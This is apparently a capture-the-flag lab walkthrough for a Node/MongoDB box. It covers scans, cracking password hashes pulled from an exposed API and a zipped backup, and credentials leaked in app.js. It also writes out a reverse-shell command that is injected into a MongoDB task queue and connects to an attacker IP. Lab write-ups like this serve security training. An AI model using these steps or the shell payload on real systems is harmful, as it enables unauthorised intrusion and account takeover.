Started with a nmap scan
```
22/tcp   open  ssh                syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  hadoop-tasktracker syn-ack ttl 63 Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Trying to hit a couple known `xml` files for this apache and everytime we do `/someting` and it does not exist we get routed back to the main site running a gobuster scan
```
200      GET       90l      249w     3861c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       15w      173c http://10.10.10.58:3000/uploads => http://10.10.10.58:3000/uploads/
301      GET        9l       15w      171c http://10.10.10.58:3000/assets => http://10.10.10.58:3000/assets/
301      GET        9l       15w      179c http://10.10.10.58:3000/assets/css => http://10.10.10.58:3000/assets/css/
301      GET        9l       15w      177c http://10.10.10.58:3000/assets/js => http://10.10.10.58:3000/assets/js/
301      GET        9l       15w      187c http://10.10.10.58:3000/assets/js/misc => http://10.10.10.58:3000/assets/js/misc/
301      GET        9l       15w      171c http://10.10.10.58:3000/vendor => http://10.10.10.58:3000/vendor/
301      GET        9l       15w      185c http://10.10.10.58:3000/assets/js/app => http://10.10.10.58:3000/assets/js/app/
301      GET        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers => http://10.10.10.58:3000/assets/js/app/controllers/
301      GET        9l       15w      191c http://10.10.10.58:3000/vendor/bootstrap => http://10.10.10.58:3000/vendor/bootstrap/
301      GET        9l       15w      199c http://10.10.10.58:3000/vendor/bootstrap/css => http://10.10.10.58:3000/vendor/bootstrap/css/
301      GET        9l       15w      197c http://10.10.10.58:3000/vendor/bootstrap/js => http://10.10.10.58:3000/vendor/bootstrap/js/
301      GET        9l       15w      203c http://10.10.10.58:3000/vendor/bootstrap/fonts => http://10.10.10.58:3000/vendor/bootstrap/fonts/
301      GET        9l       15w      185c http://10.10.10.58:3000/vendor/jquery => http://10.10.10.58:3000/vendor/jquery/
200      GET       90l      249w     3861c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       15w      173c http://10.10.10.58:3000/uploads => http://10.10.10.58:3000/uploads/
301      GET        9l       15w      171c http://10.10.10.58:3000/assets => http://10.10.10.58:3000/assets/
301      GET        9l       15w      179c http://10.10.10.58:3000/assets/css => http://10.10.10.58:3000/assets/css/
301      GET        9l       15w      177c http://10.10.10.58:3000/assets/js => http://10.10.10.58:3000/assets/js/
301      GET        9l       15w      187c http://10.10.10.58:3000/assets/js/misc => http://10.10.10.58:3000/assets/js/misc/
301      GET        9l       15w      171c http://10.10.10.58:3000/vendor => http://10.10.10.58:3000/vendor/
301      GET        9l       15w      185c http://10.10.10.58:3000/assets/js/app => http://10.10.10.58:3000/assets/js/app/
301      GET        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers => http://10.10.10.58:3000/assets/js/app/controllers/
301      GET        9l       15w      191c http://10.10.10.58:3000/vendor/bootstrap => http://10.10.10.58:3000/vendor/bootstrap/
301      GET        9l       15w      199c http://10.10.10.58:3000/vendor/bootstrap/css => http://10.10.10.58:3000/vendor/bootstrap/css/
301      GET        9l       15w      197c http://10.10.10.58:3000/vendor/bootstrap/js => http://10.10.10.58:3000/vendor/bootstrap/js/
301      GET        9l       15w      203c http://10.10.10.58:3000/vendor/bootstrap/fonts => http://10.10.10.58:3000/vendor/bootstrap/fonts/
301      GET        9l       15w      185c http://10.10.10.58:3000/vendor/jquery => http://10.10.10.58:3000/vendor/jquery/
```
Looking at the API  if we go to the `/api/users` we get 4 users and there hashed password we can try cracking them and we cracked three 
```
myPl4ceAdm1nAcc0uNT:manchester
mark:showflake
tom:spongebob
```
We got access to the admin account now when we log in to that account we can download a backup `myplace_backup` its `base64` encoded we can decode it and and then put it in a zip folder `cat myplace.backup | base64 -d > myplace-backup.zip` and this zip folder has a password on it so we can do `zip2john myplace-backup.zip hash` and then we can crack it `john hash --wordlist=rockyou.txt` and it cracked to `magicword` and we unzip it now and its a full backup of the site looking at the `app.js` file it has creds for a mongoDB `mark:5AYRft73VtFpc84k` and we can also SSH with these creds but we need to get to the `tom` account going to run linpeas to see what we might be able to do there is a `/usr/local/bin/backup` with admin and root perms but we dont have access to it we can connect to the mongoDB instance `mongo -u mark -p 5AYRft73VtFpc84k scheduler` and we can write task into the DB if we do `db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.4/443'"})` and wait for the task to be done and now we are the `tom` user now we can mess with the binary we found with suid privilege's running it we get no out put back but if we do `/usr/local/bin/backup 1 2 3` we need to do a buffer overflow on this and can make a python script to automate this and then run it in a loop until we get shell access 